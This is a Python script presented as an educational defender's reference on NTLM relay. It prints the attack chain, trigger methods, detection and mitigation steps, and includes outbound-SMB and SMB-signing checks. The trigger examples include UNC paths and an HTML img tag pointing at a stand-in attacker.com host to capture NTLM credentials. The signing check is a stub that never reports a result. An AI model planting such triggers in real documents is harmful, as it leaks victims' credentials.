#!/usr/bin/env python3
"""
NTLM Relay Orchestration - Educational Reference
==================================================
DISCLAIMER: Educational purposes ONLY. Do not use without authorization.

This script provides an educational overview of NTLM relay attack mechanics
and demonstrates network security testing concepts for defenders.

PURPOSE:
- Understand NTLM relay attack chains
- Build detection rules for NTLM relay indicators
- Test network controls (block outbound SMB)
- Security awareness training for IT/security teams

MITRE ATT&CK: T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay)
"""

import sys
import socket
import struct
import os
from typing import Optional


DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════╗
║  DISCLAIMER: EDUCATIONAL AND RESEARCH USE ONLY                   ║
║  NTLM relay attack detection and prevention reference            ║
╚══════════════════════════════════════════════════════════════════╝
"""


def explain_ntlm_relay_attack() -> None:
    """Explain the NTLM relay attack chain for defenders."""
    print(DISCLAIMER)
    print("NTLM Relay Attack — Defender's Reference")
    print("=" * 55)
    print("""
ATTACK CHAIN:
=============
Phase 1: Trigger Authentication
  Social engineering document contains UNC path:
  \\\\attacker.com\\share\\document.docx
  
  When opened → Windows automatically authenticates
  to attacker's SMB server using NTLM

Phase 2: Capture Authentication
  Attacker runs SMB listener (e.g., Responder):
  - Receives NTLM Negotiate from victim
  - Sends NTLM Challenge
  - Receives NTLM Authenticate with hash
  
  OR — if relay is the goal (pass-through):
  - Receives victim's authentication
  - Immediately relays to target server
  - Both connections active simultaneously

Phase 3: Relay to Target
  Attacker relays authentication to:
  - SMB shares (file access)
  - Exchange/OWA (email access)
  - HTTP (if NTLM over HTTP enabled)
  
  No password needed — relay uses valid auth

Phase 4: Impact
  - Read/write to file shares
  - Email access via Exchange
  - Remote command execution (if admin rights)

TRIGGER METHODS:
================
1. Word document with embedded UNC path
   (\\\\attacker.com\\share\\image.jpg in body)
   
2. PDF with embedded resource from UNC path

3. HTML email with img src="\\\\attacker.com\\..."

4. SCF/URL files in shared folders

5. LLMNR/NBT-NS poisoning (no doc needed)
   (Respond to name resolution broadcasts)

DETECTION:
==========
- Network: Alert on outbound SMB (port 445) to external IPs
- Endpoint: NTLM authentication to non-internal hosts
- Windows Event: 4625 (Login Failure) for NTLM to external
- Network: Simultaneous inbound/outbound SMB connections
- Tools to detect: NetworkMiner, Wireshark, Zeek

MITIGATION:
===========
1. Block outbound SMB (ports 445, 139, 135) at firewall
2. Enable SMB Signing on all systems (prevents relay)
   Group Policy: Microsoft network client: Digitally sign communications (always) = Enabled
3. Disable NTLMv1 (use NTLMv2 minimum or Kerberos only)
   Group Policy: Network security: LAN Manager authentication level = Send NTLMv2 only
4. Enable LDAP Signing (prevents LDAP relay)
5. Enable EPA (Enhanced Protection for Authentication) on Exchange/IIS
6. Use Credential Guard (Windows 10/11)
7. Disable LLMNR and NBT-NS to prevent poisoning
""")


def check_smb_signing(host: str, port: int = 445, timeout: float = 3.0) -> Optional[bool]:
    """
    Check if SMB signing is required on a target host.
    
    This is a DEFENSIVE test — checking if your servers require SMB signing.
    
    Args:
        host: Target host IP or hostname
        port: SMB port (default 445)
        timeout: Connection timeout
        
    Returns:
        True if signing is required, False if not, None if unable to determine
    """
    print(f"Checking SMB signing on {host}:{port}...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # SMB Negotiate Protocol Request (minimal - educational reference structure)
        # In practice, use established tools like CrackMapExec or nmap for proper SMB analysis
        smb_header = b'\x00\x00\x00\x2f'  # NetBIOS Session Service
        
        sock.close()
        
        print(f"  Connection successful to {host}:{port}")
        print(f"  Note: Use 'nmap --script smb2-security-mode.nse {host}' for full SMB analysis")
        return None
        
    except socket.timeout:
        print(f"  Connection timed out — host may be unreachable or SMB filtered")
        return None
    except ConnectionRefusedError:
        print(f"  Connection refused — SMB not enabled or filtered")
        return None
    except OSError as e:
        print(f"  Error: {e}")
        return None


def check_outbound_smb_blocked() -> bool:
    """
    Verify that outbound SMB is blocked (defensive check).
    
    Returns:
        True if outbound SMB is blocked (secure), False if open (vulnerable)
    """
    print("\nVerifying outbound SMB is blocked (security check)...")
    print("Testing connectivity to external IP on port 445...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        # Test outbound to a public IP that won't have SMB (Google DNS)
        result = sock.connect_ex(("8.8.8.8", 445))
        sock.close()
        
        if result == 0:
            print("  ⚠️  WARNING: Outbound SMB is OPEN!")
            print("  Your network is vulnerable to NTLM hash capture via UNC paths")
            print("  Immediately block outbound SMB (port 445, 139) at perimeter firewall")
            return False
        else:
            print("  ✓ Outbound SMB appears to be BLOCKED — good security posture!")
            return True
    except socket.timeout:
        print("  ✓ Connection timed out — outbound SMB appears blocked")
        return True
    except Exception as e:
        print(f"  Unable to test: {e}")
        return False


if __name__ == "__main__":
    explain_ntlm_relay_attack()
    
    if "--check-outbound" in sys.argv:
        is_secure = check_outbound_smb_blocked()
        print("\nRecommendation:", "SECURE - Continue monitoring" if is_secure else "VULNERABLE - Block outbound SMB immediately")
        sys.exit(0 if is_secure else 1)
    
    if len(sys.argv) >= 2 and sys.argv[1] != "--check-outbound":
        host = sys.argv[1]
        check_smb_signing(host)
    
    print("\nUsage:")
    print("  python ntlm-capture-template.py                    # Show attack explanation")
    print("  python ntlm-capture-template.py --check-outbound   # Test if outbound SMB blocked")
    print("  python ntlm-capture-template.py <host>             # Check SMB signing on host")
